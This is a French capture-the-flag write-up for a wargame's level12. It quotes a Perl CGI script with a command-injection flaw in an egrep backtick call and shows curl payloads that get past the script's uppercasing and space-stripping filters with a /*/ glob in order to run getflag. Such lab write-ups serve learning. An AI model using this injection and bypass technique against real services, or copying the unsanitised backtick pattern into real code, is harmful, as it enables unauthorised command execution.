Dans le répertoire de l'utilisateur, il y a un script perl.
Plus tôt, nous avions trouvés un dossier `/var/www/level12` (impossible à lire avant le level12).
À l'intérieur, le fichier est le même que celui du dossier de l'utilisateur.

Le script contient une adresse : `localhost:4646`. Étant donné qu'il est disponible dans `/var/www`, on peut imaginer qu'on peut l'executer via un appel web via curl par exemple.

Dans le script 

```pl
sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

on voit que les paramètres `x` et `y` sont utilisés, puis `..` est imprimé.

`y` est inutile ici, on ne se concentrera que sur `x`.

`@output = egrep "^$xx" /tmp/xd 2>&1;` semble etre la ligne la plus interessante, on peut voir qu'on peut injecter du code via `$xx`.

On essaye donc d'envoyer une commande via curl:
```bash
curl 127.0.0.1:4646?x='`getflag > /tmp/flag`'
```

ca ne fonctionne pas

On peut voir dans le code que on passe tout ce qui est en lower case en upper case et qu'il supprime tout ce qui est apres un espace.

On va donc creer un script qui va permettre d'appeler le getflag et on lui donne le droit d'execution `+x`.
```bash
echo 'getflag > /tmp/flag' > /tmp/SAUMON && chmod +x /tmp/SAUMON
```

On l'execute avec
```bash
curl 127.0.0.1:4646?x='`/tmp/SAUMON`'
```

Il y'a rien car tmp se transforme en TMP...

On doit donc utiliser `*` a la place qui ne peut pas etre uppercase.

```bash
curl 127.0.0.1:4646?x='`/*/SAUMON`'
```

Puis on affiche le fichier crée et on obtient alors le flag pour le level13.
